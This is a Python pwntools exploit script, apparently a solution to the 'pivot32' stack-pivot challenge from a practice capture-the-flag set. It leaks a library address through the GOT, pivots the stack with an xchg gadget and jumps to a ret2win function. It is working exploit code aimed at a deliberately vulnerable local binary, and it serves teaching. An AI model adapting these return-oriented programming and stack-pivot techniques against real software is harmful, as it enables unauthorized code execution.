from pwn import *
import time
io = process("./pivot32")
io.recvuntil(b"to pivot: ")
fakeStack = int(io.recv(10).decode(),16)
log.info("Fake Stack: " + hex(fakeStack))

footholdPlt = p32(0x08048520)
footholdGot = p32(0x804a024)
putsPlt = p32(0x08048500)
readPlt = p32(0x80484c0)
addEsp8Pop = p32(0x080484a6) #add esp, 8; pop ebx; ret;  can remove 12 bytes

padding = b"A" * 44
popEax = p32(0x0804882c)
pivotGadget = p32(0x0804882e) #xchg eax, esp

leak = footholdPlt + putsPlt + addEsp8Pop + footholdGot + b"A" * 8 + readPlt + b"BBBB" + p32(0) + p32(fakeStack + 4 * 7) + p32(100)
stackPivot = padding + popEax + p32(fakeStack) + pivotGadget

io.send(leak)
time.sleep(0.1)
io.send(stackPivot)
time.sleep(0.1)

io.recvuntil(b"libpivot\n")
footholdAddress = u32(io.recv(4))
ret2win = footholdAddress + 503
log.info("Ret2win: " + hex(ret2win))

io.send(p32(ret2win))  
io.recv()
print(io.recv().decode()[:-1])
